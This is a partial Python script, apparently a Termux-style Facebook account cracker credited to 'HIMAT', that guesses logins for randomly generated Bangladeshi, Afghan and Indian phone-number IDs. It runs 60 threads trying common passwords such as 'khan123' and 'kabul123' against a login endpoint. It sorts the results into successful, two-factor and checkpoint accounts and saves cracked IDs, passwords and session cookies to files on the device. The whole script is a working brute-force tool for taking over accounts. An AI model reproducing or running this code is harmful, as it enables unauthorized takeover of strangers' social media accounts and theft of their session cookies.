...
AFGX=f"{W}IND SIM CODE : {G}9378 9379 9370 9377 078{E}{W}"
PAKX=f"{W}PAK SIM CODE : {G}9378 9379 9370 9377 078{E}{W}"
...
{40*"="} \x1b[1;97m
 [{G}+{W}] AUTHOR   : HIMAT
 [{G}+{W}] GITHUB   : ahmadziahimat        
 [{G}+{W}] FACEBOOK : Ahmad Zia HIMAT
 [{G}+{W}] YOU TUBE : NO (?)                       
...
def Main():
	logo()
	print(f' {W}[{G}A{W}]{W} RANDOM CRACK [{G}BANGLADESH{W}]');print(f' {W}[{G}B{W}]{W} RANDOM CRACK [{G}AFGHANISTAN{W}]');print(f' {W}[{G}C{W}]{W} RANDOM CRACK [{G}INDIA{W}]')
	line()
...
def rmenu1():
	...
	with ThreadPool(max_workers=60) as tonxoys:
		...
		for rngx in xode:
			...
			if "2" in rcd:psd=[id,rngx,id[5:],"khan123","afghan123","Afghanistan","kabul123","700800","800900","۱۲۳۴۵۶","10002000"]
...
def graphrm(id,psd,tid):
	global ok,cp,lk,lop
	togg=[]
	sys.stdout.write(f'\r\r{BG}[{W}ARIF-M2{BG}]{G}{E}{BG}[{G}{lop}{W}/{G}{tid}{BG}]{E}{BG}[{W}OK{W}:{G}%s{W}/{S}%s{BG}]{E}'%(len(ok),len(lk)));sys.stdout.flush()
	for psw in psd:
		#ua=ua1()
       ...
       'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6550.164 Safari/537.36',}
		...
		if 'session_key' in lo:
			...
			print(f'\r\r{G}[ARIF-OK] {iid} | {psw}{W}');os.system('espeak -a 300 "ok id"');ok.append(id);open('/sdcard/TKM-OK.txt', 'a').write(iid+' | '+psw+' | '+id+'  ------------>>>'+coki+"\n")
			if 'y' in cokix:print(f'\r\r{R}[{G}COOKIES🏃{R}]{W} : {G}{coki}{E}');print(f"{W}{40*'-'}{E}")
			break
		elif twfx in str(lo):
			iid = lo['error']['error_data']['uid']
			print(f'\r\r{BL}[ARIF-2F] {iid} | {psw}{W}');os.system('espeak -a 300 "two,f id"');open('/sdcard/TKM-2F.txt', 'a').write(iid+' | '+psw+' | '+id+"\n")
			twf.append(id)
			break
			...
			if iid in ok:pass
				...
				if 'y' in cpx:
					print(f'\r\r{R}[ARIF-CP] {iid} | {psw}{W}');cp.append(id);os.system('espeak -a 300 "cp id"');open('/sdcard/TKM-CP.txt', 'a').write(iid+' | '+psw+' | '+id+"\n")
			break
		else:continue
	lop+=1
Main()
